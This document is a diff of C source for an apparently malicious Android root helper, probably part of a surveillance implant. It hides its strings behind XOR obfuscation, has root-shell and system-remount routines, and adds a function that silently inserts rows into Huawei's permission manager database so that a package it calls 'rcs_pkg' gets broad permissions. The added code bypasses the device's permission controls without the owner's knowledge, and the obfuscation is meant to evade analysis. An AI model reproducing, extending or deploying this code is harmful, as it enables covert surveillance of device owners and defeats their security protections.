@@ -1,5 +1,3 @@
-//#define DEBUG
-
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -28,7 +26,11 @@
 #include <linux/reboot.h>
 #include <linux/fb.h>
 #include <linux/kd.h>
+#include "utils.h"
+#include "log.h"
+#include "deobfuscate.h"
 #include "shell_params.h"
+#include "sqlite3_manager.h"
 
 
 #ifdef DEBUG
@@ -43,17 +45,17 @@ static int log_to_file(const char *full_path, const char *content, const int len
 static unsigned int getProcessId(const char *p_processname);
 static int setgod();
 static void sync_reboot();
-static int remount(const char *mntpoint, int flags);
+//static int remount(const char *mntpoint, int flags);
 static int my_mount(const char *mntpoint);
 static void my_chown(const char *user, const char *group, const char *file);
 static void my_chmod(const char *mode, const char *file);
 static void copy_root(const char *mntpnt, const char *dst);
 static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
-static int append_content(const char *content, const char *file);
+//static int append_content(const char *content, const char *file);
 static int search_content(const char *content, const char *file);
+static int add_huawei_permission(const char *rcs_pkg);
 //static int get_framebuffer(char *filename);
-static unsigned char* deobfuscate(unsigned char *s);
 
 static unsigned char ld_library_path[] = "\x92\x6f\xf2\x22\x2a\x53\x22\x25\x50\x40\x2d\x40\x55\x53\x5e\x2d\x5a\x26"; // "LD_LIBRARY_PATH"
 static unsigned char system_libs[] = "\x5a\xed\xa0\x8f\xf4\xc1\xcc\xc6\xcf\xf8\x8f\xce\xcd\xc8\xa0\x8f\xfb\xfd\xfb\xf6\xc1\xc9\x8f\xce\xcd\xc8"; // "/vendor/lib:/system/lib"
@@ -94,6 +96,7 @@ int main(int argc, char** argv) {
 	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
 	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
 	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"
+	unsigned char sql[] = "\xd6\xd7\x02\xab\xa9\x46"; // "sql"
 
 	int i;
 	unsigned char *da, *db;
@@ -267,158 +270,14 @@ int main(int argc, char** argv) {
 		execv(deobfuscate(binsh2), exec_args);
 
 		LOG("Exiting shell\n");
+
+	} else if (strcmp(argv[1], deobfuscate(sql)) == 0) {
+
+	  if(!argv[2]) return 0;
+	  
+	  add_huawei_permission(argv[2]);
+
 	}
-
-	return 0;
-}
-
-// Returned pointer pointer must be freed by the caller
-// Al momento le free() non vengono MAI chiamate perche' tutti i comandi sono one-shot
-// E' zozza ma almeno non triplichiamo tutte le righe di codice e cmq il processo non
-// resta mai attivo.
-static unsigned char* deobfuscate(unsigned char *s) {
-    unsigned char key, mod, len;
-    int i, j;
-	unsigned char* d;
-	
-    key = s[0];
-    mod = s[1];
-    len = s[2] ^ key ^ mod;
-
-	d = (unsigned char *)malloc(len + 1);
-	
-    // zero terminate the string
-    memset(d, 0x00, len + 1);
-
-    for (i = 0, j = 3; i < len; i++, j++) {
-        d[i] = s[j] ^ mod;
-        d[i] -= mod;
-        d[i] ^= key;
-    }
-
-    d[len] = 0;
-	
-    return d;
-}
-
-// Allo stato attuale, la copy funziona meglio... Questa funzione non e' usata
-// Come referenza futura: http://www.pocketmagic.net/?p=1473
-/*static int get_framebuffer(char *filename) {
-	unsigned char fb0[] = "\xef\x1c\xe2\xc0\xbb\xba\xa9\xc0\xb8\xa5\xb6\xa7\xbf\xbe\xb4\xa4\xc0\xb9\xb5\xe7"; // "/dev/graphics/fb0"
-	
-	int fd, fd_out;
-	void *bits;
-	struct fb_var_screeninfo vi;
-	struct fb_fix_screeninfo fi;
-	ssize_t written;
-
-	fd = open(deobfuscate(fb0), O_RDONLY);
-
-	if (fd < 0) {
-		//perror("cannot open fb0");
-		return 0;
-	}
-
-	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
-		//perror("failed to get fb0 info");
-		return 0; 
-	}
-
-	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
-		//perror("failed to get fb0 info");
-		return 0;
-	}
-
-
-	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);
-
-	if (bits == MAP_FAILED) {
-		//perror("failed to mmap framebuffer");
-		return 0;
-	}
-
-
-	fd_out = open(filename, O_CREAT | O_RDWR);
-
-	if (fd_out < 0) {
-		//perror("failed to create frame file");
-		return 0;
-	}
-
-	written = write(fd_out, bits, fi.smem_len);
-
-	if (written <= 0) {
-		//perror("cannot write to file");
-		return 0;
-	}
-
-	close(fd);
-	close(fd_out);
-
-	return 0;
-
-	fb->version = sizeof(*fb);
-	fb->width = vi.xres;
-	fb->height = vi.yres;
-	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
-	fb->data = bits;
-	fb->format = GGL_PIXEL_FORMAT_RGB_565;
-
-	fb++;
-
-	fb->version = sizeof(*fb);
-	fb->width = vi.xres;
-	fb->height = vi.yres;
-	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
-	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
-	fb->format = GGL_PIXEL_FORMAT_RGB_565;
-
-	return fd;
-}*/
-
-static int append_content(const char *content, const char *file) {
-	FILE *fd;
-	char *data = NULL;
-	int size = 0;
-	char *newline = "\n";
-
-	if ((fd = fopen(file, "r+")) == NULL) {
-		LOG("Unable to open source file in r+ mode\n");
-		return -1;
-	}
-
-	fseek(fd, 0L, SEEK_END);
-	size = ftell(fd);
-	fseek(fd, 0L, SEEK_SET);
-
-	data = (char *)malloc(size + 1);
-	memset(data, 0x00, size + 1);
-
-	LOG("Reading %d bytes\n", size);
-
-	fread(data, size, 1, fd);
-
-	if (strcasestr(data, content) != NULL) {
-		LOG("Needle already present\n");
-
-		fclose(fd);
-		free(data);
-		return -1;
-	}
-
-	fseek(fd, 0L, SEEK_END);
-
-	if (fwrite(content, strlen(content), 1, fd) > 0) {
-		LOG("Content successfully written to file\n");
-	} else {
-		LOG("Unable to write content to file\n");
-	}
-
-	fwrite(newline, strlen(newline), 1, fd);
-
-	fclose(fd);
-	free(data);
-	sync();
 
 	return 0;
 }
@@ -647,60 +506,6 @@ static void sync_reboot() {
 	}
 }
 
-static int remount(const char *mntpoint, int flags) {
-	unsigned char mounts[] = "\x84\xe0\x68\x6b\x34\x36\x2b\x27\x6b\x29\x2b\x31\x2a\x30\x37"; // "/proc/mounts"
-	unsigned char r[] = "\x19\xfe\xe6\x97"; // "r"
-	unsigned char t1[] = "\x39\x8e\xb5\x29\x30"; // " \t"
-	unsigned char t2[] = "\xd4\x35\xe3\x1c\x27"; // " \t"
-	unsigned char t3[] = "\xa8\xbd\x17\xf8\xe3"; // " \t"
-
-    FILE *f = NULL;
-    int found = 0;
-    char buf[1024], *dev = NULL, *fstype = NULL;
-
-    if ((f = fopen(deobfuscate(mounts), deobfuscate(r))) == NULL) {
-		LOG("Unable to open /proc/mounts\n");
-        return -1;
-    }
-
-    memset(buf, 0, sizeof(buf));
-
-    for (;!feof(f);) {
-        if (fgets(buf, sizeof(buf), f) == NULL)
-            break;
-
-        if (strstr(buf, mntpoint)) {
-            found = 1;
-            break;
-        }
-    }
-
-    fclose(f);
-
-    if (!found) {
-		LOG("Cannot find mountpoint: %s\n", mntpoint);
-		
-        return -1;
-    }
-
-    if ((dev = strtok(buf, deobfuscate(t1))) == NULL) {
-		LOG("Cannot find first mount entry\n");
-        return -1;
-    }
-
-    if (strtok(NULL, deobfuscate(t2)) == NULL) {
-		LOG("Cannot find second mount entry\n");
-        return -1;
-    }
-
-    if ((fstype = strtok(NULL, deobfuscate(t3))) == NULL) {
-		LOG("Cannot find third mount entry\n");
-        return -1;
-    }
-
-    return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
-}
-
 static int my_mount(const char *mntpoint) {
 	unsigned char t1[] = "\x77\xe9\x9c\xa9\x8e"; // " \t"
 	unsigned char t2[] = "\xab\xbd\x14\xf5\xe2"; // " \t"
@@ -752,6 +557,32 @@ static int my_mount(const char *mntpoint) {
     }
 
     return mount(dev, mntpoint, fstype, 0, 0);
+}
+
+static int add_huawei_permission(const char *rcs_pkg) {
+  unsigned char sys_pkg[] = "\xb0\x55\xfc\xa1\x7c\x73\x4c\x73\xa1\x4d\x4b\x4d\x4c\x7f\x67\xa1\x40\x73\x7d\x65\x73\x79\x7f\x4d\xa6\x48\x67\x64"; // "/data/system/packages.xml"
+  unsigned char hw_db[] = "\x99\x1a\xbc\xca\x0d\x08\x1d\x08\xca\x0d\x08\x1d\x08\xca\x0e\x0a\x14\xcb\x11\x1c\x08\x12\x0c\x10\xcb\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\x14\x08\x0b\x08\x02\x0c\x1f\xca\x0d\x08\x1d\x08\x0f\x08\x1e\x0c\x1e\xca\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\xcb\x0d\x0f"; // "/data/data/com.huawei.permissionmanager/databases/permission.db"
+  unsigned char obf_query[] = "\xc5\x29\x9c\x9c\x9d\x96\x80\xe9\x93\x27\x9c\x9d\x93\x9a\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x27\x3f\xea\xfc\xe3\x3b\x27\xf7\xe4\xe6\xfe\xe4\xe2\xe0\x9d\xe4\xf8\xe0\x3b\x27\xf0\xfc\xe3\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xfa\xe3\xe0\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x3c\x27\x95\x84\x9b\x90\x80\x96\x27\x3f\x34\x37\x37\x37\x3b\x27\x22\x20\xf6\x22\x3b\x27\x20\xe3\x3b\x27\x20\xe3\x3b\x27\x37\x3c\x0e"; // "INSERT INTO permissionCfg (_id, packageName, uid, permissionCode, permissionCfg) VALUES (1000, '%s', %d, %d, 0);"
+  int uid;
+  char query[2048];
+  int permissions = 60191;
+
+  if(!rcs_pkg)
+    return 0;
+
+  uid = get_package_uid(rcs_pkg);    
+  if(!uid) return 0;
+
+  memset(query, 0, sizeof(query));
+  snprintf(query, sizeof(query), deobfuscate(obf_query), rcs_pkg, uid, permissions);
+
+  LOGD("Query: %s\n", query);
+
+  if(sqlite_manager_init()) 
+    sqlite_manager_query(deobfuscate(hw_db), query);
+
+  return 1;
+
 }
 
 
